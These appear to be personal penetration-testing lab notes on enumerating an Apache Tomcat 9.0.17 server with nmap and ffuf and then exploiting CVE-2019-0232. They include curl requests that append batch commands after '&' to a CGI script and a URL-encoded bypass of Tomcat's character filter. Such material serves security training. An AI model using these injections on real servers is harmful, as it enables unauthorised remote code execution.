### Footprinting + Enumeration
##### Nmap output
```bash
8080/tcp  open  http-proxy
|_http-title: Apache Tomcat/9.0.17
|_http-favicon: Apache Tomcat
```
##### Fuzzing for CGI Scripts
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.201.89:8080/

ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.201.89:8080/cgi/FUZZ.cmd

ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.201.89:8080/cgi/FUZZ.bat
```

```bash
curl http://10.129.204.227:8080/cgi/welcome.bat
```

### Exploitation
![[Pasted image 20250213065042.png]]
`CVE-2019-0232` is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the `enableCmdLineArguments` feature enabled. Versions `9.0.0.M1` to `9.0.17`, `8.5.0` to `8.5.39`, and `7.0.0` to `7.0.93` of Tomcat are affected.

We can exploit `CVE-2019-0232` by appending our own commands through the use of the batch command separator `&`.

View enviroment variables
```bash
curl http://10.129.204.227:8080/cgi/welcome.bat?&set
```
From the list, we can see that the `PATH` variable has been unset, so we will need to hardcode paths in requests:
```bash
curl http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```
The attempt was unsuccessful, and Tomcat responded with an error message indicating that an invalid character had been encountered. Apache Tomcat introduced a patch that utilises a regular expression to prevent the use of special characters. However, the filter can be bypassed by URL-encoding the payload.
```bash
curl http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```